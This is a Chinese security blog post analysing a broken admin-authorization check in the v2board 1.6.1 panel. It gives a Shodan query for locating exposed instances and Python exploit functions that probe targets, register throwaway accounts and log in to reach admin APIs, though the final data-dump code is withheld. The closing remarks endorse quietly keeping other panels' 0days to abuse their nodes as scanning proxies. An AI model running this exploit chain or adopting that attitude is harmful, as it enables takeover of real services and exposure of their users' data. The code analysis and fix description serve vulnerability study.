---
title: v2board v.1.6.1 机场面板管理接口越权漏洞分析
url: https://zgao.top/v2board-v-1-6-1-%e6%9c%ba%e5%9c%ba%e9%9d%a2%e6%9d%bf%e7%ae%a1%e7%90%86%e6%8e%a5%e5%8f%a3%e8%b6%8a%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/
source: Zgao's blog
date: 2022-12-22
fetch_date: 2025-10-04T02:12:00.292276
---

# v2board v.1.6.1 机场面板管理接口越权漏洞分析

# [Zgao's blog](https://zgao.top/)

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

Toggle navigation

* [工具箱](https://zgao.top/tool/)
* [文章归档](https://zgao.top/archives/)
* [关于我](https://zgao.top/about-me/)
* [github](https://github.com/zgao264)
* Gmail

# v2board v.1.6.1 机场面板管理接口越权漏洞分析

* [首页](https://zgao.top)
* [v2board v.1.6.1 机场面板管理接口越权漏洞分析](https://zgao.top:443/v2board-v-1-6-1-%E6%9C%BA%E5%9C%BA%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

[12月 21, 2022](https://zgao.top/2022/12/)

### v2board v.1.6.1 机场面板管理接口越权漏洞分析

作者 [Zgao](https://zgao.top/author/zgao/)
在[[漏洞复现](https://zgao.top/category/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)](https://zgao.top/v2board-v-1-6-1-%E6%9C%BA%E5%9C%BA%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

![](https://zgao.top/wp-content/uploads/2022/12/image-25.png)

前几天爆发的v2board机场面板漏洞，泄露了大量机场用户的数据。简单看了下，原理挺简单的，就是authorization使用redis缓存后没有对普通用户和管理员做鉴权。以普通用户登录成功后可以直接请求管理员的接口。

文章目录

[ ]

* [Shodan 搜索语法](#Shodan_%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95 "Shodan 搜索语法")
* [漏洞exp](#%E6%BC%8F%E6%B4%9Eexp "漏洞exp")
* [漏洞代码分析](#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90 "漏洞代码分析")
* [exp开发思路](#exp%E5%BC%80%E5%8F%91%E6%80%9D%E8%B7%AF "exp开发思路")
  + [如何鉴别存在漏洞的v2board版本？](#%E5%A6%82%E4%BD%95%E9%89%B4%E5%88%AB%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84v2board%E7%89%88%E6%9C%AC%EF%BC%9F "如何鉴别存在漏洞的v2board版本？")
  + [判断是否需要邮箱验证注册](#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E9%9C%80%E8%A6%81%E9%82%AE%E7%AE%B1%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%86%8C "判断是否需要邮箱验证注册")
  + [注册账号并登录](#%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%E5%B9%B6%E7%99%BB%E5%BD%95 "注册账号并登录")
  + [登录账号将authorization写入redis缓存](#%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%B0%86authorization%E5%86%99%E5%85%A5redis%E7%BC%93%E5%AD%98 "登录账号将authorization写入redis缓存")
  + [获取管理员接口数据](#%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE "获取管理员接口数据")
* [总结](#%E6%80%BB%E7%BB%93 "总结")

## Shodan 搜索语法

```
http.html:"/theme/v2board/assets/"
```

![](https://zgao.top/wp-content/uploads/2022/12/image-21-1024x716.png)

## 漏洞exp

<https://github.com/zgao264/v2board-exp>

## 漏洞代码分析

代码位置：app/Http/Middleware/Admin.php

![](https://zgao.top/wp-content/uploads/2022/12/image-22-1024x907.png)

在Admin.php中判断redis缓存中是否存在authorization，如果存在就可以访问admin的接口。而这个authorization是没有进一步判断是不是管理员的authorization，所以就造成了普通用户也可以接管机场后台。

![](https://zgao.top/wp-content/uploads/2022/12/image-23-1024x410.png)

修复后的代码去掉了之前缓存判断的逻辑。

## exp开发思路

漏洞原理非常简单，那么如何快速写一个exp脚本？

### 如何鉴别存在漏洞的v2board版本？

观察上面存在漏洞的代码，我们可以发现在缓存的判断逻辑中，403的提示是不一样的。如果请求header中没有携带authorization，那么就返回`未登录或登陆已过期`。如果有则进一步判断authorization的值是否在redis中，没有则`返回鉴权失败，请重新登录`。

所以我们可以构造一个请求触发**返回鉴权失败，请重新登录**这个403。代码如下：

```
headers = {
    'authorization': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36',
}

def POC():
    """
    检测目标v2board是否为v1.6.1漏洞版本
    """
    path = '/api/v1/admin/config/fetch'
    url = f"{target}{path}".replace('//api','/api')
    r = s.get(url,headers=headers,verify=False)
    if r.status_code == 403 and '\\u9274\\u6743\\u5931\\u8d25'  in r.text:
        print(f"[+]{target}存在漏洞！")
    else:
        print(f"[-]{target}不存在漏洞！")
        exit(0)
```

手动构造一个header，authorization可以是任意值。

### 判断是否需要邮箱验证注册

v2board的后台大部分是可以直接注册的，部分需要邮箱验证。对于邮箱验证的需要对接邮箱的api才能完成自动化利用，我就懒得写了。

![](https://zgao.top/wp-content/uploads/2022/12/image-26-1024x540.png)

代码如下：

```
def check_verify():
    """
    判断目标注册是否需要邮箱、邀请验证
    """
    path = '/api/v1/guest/comm/config'
    url = f"{target}{path}".replace('//api','/api')
    resp = s.get(url,headers=headers).json()['data']
    if not resp['is_invite_force'] and not resp['is_email_verify']:
        print(f"[+]目标无需邮箱验证，可直接获取权限")
    elif resp['is_invite_force']:
        print(f"[-]目标需要邀请注册，无法获取权限!")
        exit(0)
    elif resp['is_email_verify']:
        print("目标需要获取邮箱验证码才能进一步利用！")
        exit(0)
```

### 注册账号并登录

对于没有邮箱验证的后台，可以使用任意伪造的邮箱进行注册，注册成功后会返回auth\_data。

```
def registry_acc():
    """
    随机注册账号,并返回auth_data
    """
    rand_num = str(random.random())[8:]
    QQ_mail = rand_num + '@qq.com'
    passwd = rand_num

    data = {
        'email': QQ_mail,
        'password': passwd,
        'invite_code': '',
        'email_code': ''
    }
    path = '/api/v1/passport/auth/register'
    url = f"{target}{path}".replace('//api','/api')

    r = s.post(url,headers=headers,data=data)
    if r.status_code == 200:
        print(f"[+]当前随机注册的账号为{QQ_mail},密码为{passwd}")
        return QQ_mail,passwd
    else:
        print(f"[-]目标已关闭账号注册！")
        exit(0)
```

### 登录账号将authorization写入redis缓存

这个是很重要的一步，为漏洞代码的判断逻辑。注意登录后需要请求/user/info接口才能使authorization生效。

```
def login(email,passwd):
    """
    登录后需要请求/user/info接口才能使authorization生效
    """
    data = {
        'email': email,
        'password': passwd
    }
    path = '/api/v1/passport/auth/login'
    url = f"{target}{path}".replace('//api','/api')
    r = s.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print('[+]账号登录成功！')
        auth_data = r.json()['data']['auth_data']
        headers['authorization'] = auth_data
        s.get(f'{target}/api/v1/user/info', headers=headers)
        return auth_data
    else:
        print('[-]账号登录失败！')
        exit(0)
```

### 获取管理员接口数据

这部分就是把敏感的管理接口数据给dump下来，代码就不放了。利用如下：

![](https://zgao.top/wp-content/uploads/2022/12/exp-1024x772.png)

## 总结

漏洞原理很简单，属于逻辑漏洞。但是从代码审计的角度还不一定好发现，渗透测越权应该很容易测试出来。

但是我还是想吐槽一下，公开机场的这些用户数据也没啥意义，大不了换个订阅继续弄。有0day还不如留着白嫖机场节点，我之前挖的其他机场的漏洞从来没公开过，用来做扫描代理还是挺好使的。

Post Views: 6,270

赞赏

![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114105.jpeg)微信赞赏![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114100.jpeg)支付宝赞赏

###### Zgao

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

### 目前为止有一条评论

###### Carl 发布于5:49 下午 - 2月 1, 2023

拜谢大佬！大佬收徒弟么？

[回复](https://zgao.top/v2board-v-1-6-1-%E6%9C%BA%E5%9C%BA%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/?replytocom=4795#respond)

### 发表评论 [取消回复](/v2board-v-1-6-1-%E6%9C%BA%E5%9C%BA%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#respond)

Δ

版权©2020 Author By : Zgao